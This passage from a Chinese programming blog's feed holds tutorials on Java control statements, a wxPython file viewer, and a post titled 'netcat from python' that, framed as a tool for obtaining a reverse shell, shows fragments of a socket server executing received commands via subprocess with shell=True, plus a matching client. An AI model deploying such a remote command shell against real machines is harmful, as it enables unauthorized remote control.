false。&amp;&amp;与&amp;区别：如果 a 为 false，则不计算b|a &amp;&amp; b|<br>||||短路或|ab 全为 false 时，计算结果为 false，否则为 true。||与|区别：如果 a 为 true，则不计算 b|a||b|</p></blockquote><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">java_if</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> source <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>source <span class="token operator">>=</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>source <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>source <span class="token operator">>=</span> <span class="token number">70</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"E"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        if (source &lt;60) {</span><span class="token comment" spellcheck="true">//            System.out.println("不及格，加油哦！");</span><span class="token comment" spellcheck="true">//        }else {</span><span class="token comment" spellcheck="true">//            System.out.println("真棒，及格。");</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">//        if (source>= 85){</span><span class="token comment" spellcheck="true">//            System.out.println("你真优秀！");</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">//        if (source&lt;60){</span><span class="token comment" spellcheck="true">//            System.out.println("您需要继续加油哦！");</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">//        if ((source>60) &amp;&amp; (source&lt;=85)) {</span><span class="token comment" spellcheck="true">//            System.out.println("不错哦，继续努力！");</span><span class="token comment" spellcheck="true">//        }</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Swatch</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> testsorce <span class="token operator">=</span> <span class="token number">75</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> grade<span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>testsorce<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>                grade <span class="token operator">=</span> <span class="token string">'优'</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                grade <span class="token operator">=</span> <span class="token string">'良'</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>            <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                grade <span class="token operator">=</span> <span class="token string">'中'</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token operator">:</span>                    grade <span class="token operator">=</span> <span class="token string">'差'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Grade="</span><span class="token operator">+</span>grade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>Grade=中</code></pre><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">java_while</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">*</span>i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            i <span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>012345678910</code></pre><h3 id="do-while"><a href="#do-while" class="headerlink" title="do-while"></a>do-while</h3><blockquote><p> do-while语句使用和while相似，不过do-while是事后判断循环的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class java_do_while {<br>    public static void main(String[] args){<br>        int i = 0;<br>        do {<br>            i++;<br>            System.out.println(i);<br>        }while (i*i&lt;100);<br>    }<br>}</p><pre><code></code></pre><p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>```</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nwx（wxPython）</title>
      <link href="/2019/01/19/nwx-wxpython/"/>
      <url>/2019/01/19/nwx-wxpython/</url>
      
        <content type="html"><![CDATA[<h1 id="wx（wxPython）"><a href="#wx（wxPython）" class="headerlink" title="wx（wxPython）"></a>wx（wxPython）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 使用了很多模块心血来潮觉得要写一些相关模块的使用文档。并想把常用的模块写成一个自己常用的类。这样只需要调用就行了，可以对自己写东西的时候节省时间。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre class=" language-python"><code class="language-python">pip install <span class="token operator">-</span>U wxPython</code></pre><h2 id="创建一个简单程序"><a href="#创建一个简单程序" class="headerlink" title="创建一个简单程序"></a>创建一个简单程序</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># First things, first. Import the wxPython package.</span><span class="token keyword">import</span> wx<span class="token comment" spellcheck="true"># Next, create an application object.</span>app <span class="token operator">=</span> wx<span class="token punctuation">.</span>App<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Then a frame.</span>frm <span class="token operator">=</span> wx<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span>None<span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Show it.</span>frm<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Start the event loop.</span>app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h2><blockquote><p> wx.BoxSizer()<br> 这个可以设置你的box的比例。proportion比例设置。</p><pre class=" language-python"><code class="language-python">url_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>label<span class="token operator">=</span>u<span class="token string">"路径："</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>path_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>wx<span class="token punctuation">.</span>TE_MULTILINE<span class="token punctuation">)</span>openfile_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>label<span class="token operator">=</span>u<span class="token string">"打开"</span><span class="token punctuation">)</span>openfile_text<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>readfile<span class="token punctuation">)</span>self<span class="token punctuation">.</span>content_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>style <span class="token operator">=</span>wx<span class="token punctuation">.</span>TE_MULTILINE<span class="token punctuation">)</span>box <span class="token operator">=</span> wx<span class="token punctuation">.</span>BoxSizer<span class="token punctuation">(</span><span class="token punctuation">)</span>box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>url_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">,</span>flag <span class="token operator">=</span> wx<span class="token punctuation">.</span>ALIGN_CENTER<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALIGN_RIGHT<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>path_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>flag <span class="token operator">=</span> wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>openfile_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token operator">=</span> wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre></blockquote><h3 id="设置了0-5-3-1"><a href="#设置了0-5-3-1" class="headerlink" title="设置了0.5|3|1"></a>设置了0.5|3|1</h3><p><a href="https://image.kalifun.top/upload/1902/270a32000255164c.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1902/270a32000255164c.png" alt></a></p><pre class=" language-python"><code class="language-python">v_box <span class="token operator">=</span> wx<span class="token punctuation">.</span>BoxSizer<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>VERTICAL<span class="token punctuation">)</span>v_box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>box<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">,</span>flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>v_box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>content_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><h3 id="上下分为两个部分，上下分为0-5-5"><a href="#上下分为两个部分，上下分为0-5-5" class="headerlink" title="上下分为两个部分，上下分为0.5|5"></a>上下分为两个部分，上下分为0.5|5</h3><p> 设置了 0.5|5<br><a href="https://image.kalifun.top/upload/1902/741a19ade9085a02.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1902/741a19ade9085a02.png" alt></a></p><h2 id="创建事件"><a href="#创建事件" class="headerlink" title="创建事件"></a>创建事件</h2><blockquote><p> 创建事件基本发生在button上。创建事件关键词bind</p><pre class=" language-python"><code class="language-python">openfile_text<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>readfile<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">readfile</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span></code></pre></blockquote><h2 id="完全代码"><a href="#完全代码" class="headerlink" title="完全代码"></a>完全代码</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">OpenfileTool</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>parent<span class="token punctuation">,</span>title<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> parent<span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>panel <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>content<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">content</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        url_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>label<span class="token operator">=</span>u<span class="token string">"路径："</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>path_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>wx<span class="token punctuation">.</span>TE_MULTILINE<span class="token punctuation">)</span>        openfile_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>label<span class="token operator">=</span>u<span class="token string">"打开"</span><span class="token punctuation">)</span>        openfile_text<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>readfile<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>content_text <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>panel<span class="token punctuation">,</span>style <span class="token operator">=</span>wx<span class="token punctuation">.</span>TE_MULTILINE<span class="token punctuation">)</span>        box <span class="token operator">=</span> wx<span class="token punctuation">.</span>BoxSizer<span class="token punctuation">(</span><span class="token punctuation">)</span>        box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>url_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">,</span>flag <span class="token operator">=</span> wx<span class="token punctuation">.</span>ALIGN_CENTER<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALIGN_RIGHT<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>path_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>flag <span class="token operator">=</span> wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>openfile_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token operator">=</span> wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        v_box <span class="token operator">=</span> wx<span class="token punctuation">.</span>BoxSizer<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>VERTICAL<span class="token punctuation">)</span>        v_box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>box<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">,</span>flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        v_box<span class="token punctuation">.</span>Add<span class="token punctuation">(</span>self<span class="token punctuation">.</span>content_text<span class="token punctuation">,</span>proportion <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>flag<span class="token operator">=</span>wx<span class="token punctuation">.</span>EXPAND<span class="token operator">|</span>wx<span class="token punctuation">.</span>ALL<span class="token punctuation">,</span>border<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>panel<span class="token punctuation">.</span>SetSizer<span class="token punctuation">(</span>v_box<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">readfile</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> wx<span class="token punctuation">.</span>FileDialog<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"Open XYZ file"</span><span class="token punctuation">,</span> wildcard<span class="token operator">=</span><span class="token string">"txt files (*.txt)|*.txt"</span><span class="token punctuation">,</span>style<span class="token operator">=</span>wx<span class="token punctuation">.</span>FD_OPEN <span class="token operator">|</span> wx<span class="token punctuation">.</span>FD_FILE_MUST_EXIST<span class="token punctuation">)</span> <span class="token keyword">as</span> fileDialog<span class="token punctuation">:</span>            <span class="token keyword">if</span> fileDialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_CANCEL<span class="token punctuation">:</span>                <span class="token keyword">return</span>                 <span class="token comment" spellcheck="true"># the user changed their mind</span>            <span class="token comment" spellcheck="true"># Proceed loading the file chosen by the user</span>            pathname <span class="token operator">=</span> fileDialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>path_text<span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> open<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># datas = file.readlines()</span>                    <span class="token comment" spellcheck="true"># for data in datas:</span>                    <span class="token comment" spellcheck="true">#     self.loadfile(data)</span>                    self<span class="token punctuation">.</span>content_text<span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span>file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>                wx<span class="token punctuation">.</span>LogError<span class="token punctuation">(</span><span class="token string">"Cannot open file '%s'."</span> <span class="token operator">%</span> newfile<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># def loadfile(self,data):</span>    <span class="token comment" spellcheck="true">#     self.content_text.SetValue(data)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> wx<span class="token punctuation">.</span>App<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>    frame <span class="token operator">=</span> OpenfileTool<span class="token punctuation">(</span>None<span class="token punctuation">,</span><span class="token string">"OpenfileTool"</span><span class="token punctuation">)</span>    frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netcat  from python</title>
      <link href="/2019/01/17/netcat-from-python/"/>
      <url>/2019/01/17/netcat-from-python/</url>
      
        <content type="html"><![CDATA[<h1 id="netcat-from-python"><a href="#netcat-from-python" class="headerlink" title="netcat  from python"></a>netcat  from python</h1><blockquote><p> 在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。<br>学习信息安全的应该很熟悉，用来反弹shell。</p></blockquote><h2 id="Model-socket"><a href="#Model-socket" class="headerlink" title="Model [socket]"></a>Model [socket]</h2><blockquote><p>网络上的两个程序通过一个双向的通信连接实现数据的交换，这个连接的一端称为一个socket。<br> 我们需要一个服务端和客户端之间进行通信连接<br> 支持TCP/UDP协议，在未被关闭TCP的情况下还是使用TCP协议（三次握手还是比较稳的）。</p></blockquote><h2 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h2><blockquote><h3 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h3><pre class=" language-python"><code class="language-python">Tcp_server <span class="token operator">=</span> SocketServer<span class="token punctuation">.</span>ThreadingTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>socket_ip<span class="token punctuation">)</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>socket_port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Tcp_socket<span class="token punctuation">)</span>Tcp_server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><h4 id="实现多线程TCP，这样可以多个客户端进行连接。"><a href="#实现多线程TCP，这样可以多个客户端进行连接。" class="headerlink" title="实现多线程TCP，这样可以多个客户端进行连接。"></a>实现多线程TCP，这样可以多个客户端进行连接。</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                get_bytes <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                get_info <span class="token operator">=</span> str<span class="token punctuation">(</span>get_bytes<span class="token punctuation">)</span>                <span class="token keyword">if</span> get_info <span class="token operator">==</span> <span class="token string">"q"</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">try</span><span class="token punctuation">:</span>                        command <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>get_bytes<span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>universal_newlines<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>                        command_info <span class="token operator">=</span> conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">except</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> command                    <span class="token comment" spellcheck="true"># try:</span>                    <span class="token comment" spellcheck="true">#     command = os.popen(get_bytes).read()</span>                    <span class="token comment" spellcheck="true">#     command_info = conn.send(bytes(command))</span>                    <span class="token comment" spellcheck="true"># except Exception,e:</span>                    <span class="token comment" spellcheck="true">#     command = os.popen(get_bytes).read()</span>                    <span class="token comment" spellcheck="true">#     command_info = conn.send(bytes(command))                     </span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>                <span class="token keyword">print</span> e</code></pre><p> 摒弃os.popen，当出现错误命令时导致服务卡死。</p><blockquote><h3 id="client-py"><a href="#client-py" class="headerlink" title="client.py"></a>client.py</h3><p>将请求发送给服务端，然后接收返回值的一个过程。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            sed_data <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">">>>"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> sed_data <span class="token operator">==</span> <span class="token string">"q"</span><span class="token punctuation">:</span>                conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span>sed_data<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span>sed_data<span class="token punctuation">)</span><span class="token punctuation">)</span>                    get_bytes <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    get_info <span class="token operator">=</span> str<span class="token punctuation">(</span>get_bytes<span class="token punctuation">)</span>                    <span class="token keyword">print</span> get_info                <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"Command Not Found !"</span>                    create_socket<span class="token punctuation">(</span>socket_ip<span class="token punctuation">,</span>socket_port<span class="token punctuation">)</span></code></pre></blockquote><pre><code>                # sed_data = raw_input(&quot;&gt;&gt;&gt;&quot;)                # conn.send(bytes(sed_data))                # get_bytes = conn.recv(1024)                # get_info = str(get_bytes)                # print get_info    except Exception,e:        print e</code></pre><p>```<br>利用报错处理来重新调用函数来解决输入错误命令卡死的现象。<br>当输入错误命令时，多输入两次命令让程序进行重新调用函数。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> netcat </tag>
            
            <tag> hack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>豆瓣TOP250</title>
      <link href="/2018/12/29/dou-ban-top250/"/>
      <url>/2018/12/29/dou-ban-top250/</url>
      
